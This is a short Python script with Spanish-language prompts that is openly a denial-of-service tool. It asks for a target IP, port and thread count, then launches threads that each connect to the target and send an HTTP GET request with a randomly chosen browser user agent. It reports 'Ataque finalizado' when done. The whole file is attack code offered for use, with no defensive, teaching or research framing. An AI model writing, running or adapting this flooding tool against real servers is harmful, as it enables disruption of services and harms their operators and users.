import socket
import threading
import random
from rich.console import Console
import requests
import time

console = Console()

def ddos_attack(ip, port, user_agent):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(3)
            sock.connect((ip, port))
            request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {user_agent}\r\n\r\n"
            sock.sendall(request.encode())
            response = sock.recv(1024)
            if response:
                console.print(f"[bold green]Paquete enviado a {ip}[/bold green]")
            else:
                console.print(f"[bold red]Sin respuesta de {ip}[/bold red]")
    except Exception as e:
        console.print(f"[bold red]Error al conectar con {ip}:{port} - {e}[/bold red]")

def random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
    ]
    return random.choice(user_agents)

def main():
    ip = input("Ingrese la IP del servidor objetivo: ")
    port = int(input("Ingrese el puerto del servidor objetivo: "))
    num_threads = int(input("Ingrese el n√∫mero de hilos: "))
    user_agent = random_user_agent()

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=ddos_attack, args=(ip, port, user_agent))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    console.print(f"[bold green]Ataque finalizado contra {ip}[/bold green]")

if __name__ == "__main__":
    main()